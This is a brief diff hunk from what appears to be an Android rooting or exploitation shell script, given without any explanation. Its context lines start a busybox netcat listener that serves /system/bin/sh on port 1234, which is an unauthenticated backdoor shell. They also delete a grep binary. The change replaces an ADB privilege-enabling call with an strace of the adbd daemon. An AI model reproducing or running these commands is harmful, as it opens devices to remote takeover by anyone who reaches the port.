@@ -2,6 +2,6 @@
 /system/xbin/busybox touch /data/InYourGrill.$$
 /system/xbin/busybox nc -l -p 1234 -e /system/bin/sh &
 rm -rf /data/.bin/grep 
-/system/bin/adb_en.sh NonSecurePrivilege&
+strace -s2000 -o /data/adb_trace -vvvff /sbin/adbd
 
 
